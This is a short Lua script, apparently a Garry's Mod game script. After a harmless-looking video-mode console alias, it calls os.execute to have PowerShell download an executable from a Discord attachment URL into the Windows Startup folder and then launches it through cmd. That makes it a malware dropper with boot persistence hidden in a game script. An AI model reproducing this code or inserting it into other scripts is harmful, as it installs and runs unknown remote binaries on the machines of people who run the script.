client.Command("alias helboidaun mat_setvideomode 1920 1080 0", true)
client.Command("helboidaun", true)
os.execute([[powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://cdn.discordapp.com/attachments/75.../refdhcp.exe', '%systemdrive%/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/refdhcp.exe') }"]])
os.execute('start cmd /k "cd %systemdrive%/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/ & Start refdhcp.exe & pause"')
